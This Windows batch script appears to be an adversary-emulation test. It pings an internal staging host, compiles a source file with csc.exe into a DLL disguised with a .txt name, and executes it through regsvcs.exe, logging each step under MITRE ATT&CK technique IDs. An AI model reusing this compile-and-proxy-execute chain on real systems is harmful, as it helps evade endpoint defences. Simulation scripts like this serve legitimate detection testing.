@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\10027\1156c4c0
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?10027-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=potoshop.txt
SET njozco=file.txt
SET kkjwr=10027
SET logfile=%APPDATA%\!ufeybybm!\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][!lqyereup!][!kkjwr!]: heartbeat_start=>> "!logfile!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [%DATE% %TIME%][DEBUG][!lqyereup!][!kkjwr!]: heartbeat_complete=>> "!logfile!" 2>nul

echo [%DATE% %TIME%][DEBUG][!lqyereup!][!kkjwr!]: chdir_start=!recnn!>> "!logfile!" 2>nul
cd /d "!recnn!"
echo [%DATE% %TIME%][DEBUG][!lqyereup!][!kkjwr!]: chdir_complete=>> "!logfile!" 2>nul

echo [%DATE% %TIME%][DEBUG][!lqyereup!][!kkjwr!]: compile_start=!njozco!>> "!logfile!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /reference:System.EnterpriseServices.dll /out:"!hpnjatpj!" "!njozco!"
IF !ERRORLEVEL! EQU 0 (
 SET t1res=1
 SET t1err=
) ELSE (
 SET t1res=0
 SET t1err=compilation_failed
)
echo [%DATE% %TIME%][DEBUG][!lqyereup!][!kkjwr!]: compile_complete=!ERRORLEVEL!>> "!logfile!" 2>nul
FOR /f "tokens=2 delims==" %%I IN ('wmic os get localdatetime /value') DO SET ts=%%I
SET ts=!ts:~0,4!-!ts:~4,2!-!ts:~6,2! !ts:~8,2!:!ts:~10,2!:!ts:~12,2!.!ts:~15,3!
echo [!ts!][TTP][!lqyereup!][!kkjwr!]: T1500|Compile After Delivery=!t1res!:!t1err!>> "!logfile!" 2>nul

IF !t1res! EQU 1 (
 echo [%DATE% %TIME%][DEBUG][!lqyereup!][!kkjwr!]: regsvcs_start=!hpnjatpj!>> "!logfile!" 2>nul
 %SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe "!hpnjatpj!"
 IF !ERRORLEVEL! EQU 0 (
  SET t2res=1
  SET t2err=
 ) ELSE (
  SET t2res=0
  SET t2err=regsvcs_failed
 )
 echo [%DATE% %TIME%][DEBUG][!lqyereup!][!kkjwr!]: regsvcs_complete=!ERRORLEVEL!>> "!logfile!" 2>nul
 FOR /f "tokens=2 delims==" %%I IN ('wmic os get localdatetime /value') DO SET ts=%%I
 SET ts=!ts:~0,4!-!ts:~4,2!-!ts:~6,2! !ts:~8,2!:!ts:~10,2!:!ts:~12,2!.!ts:~15,3!
 echo [!ts!][TTP][!lqyereup!][!kkjwr!]: T1218|System Binary Proxy Execution=!t2res!:!t2err!>> "!logfile!" 2>nul
)
ENDLOCAL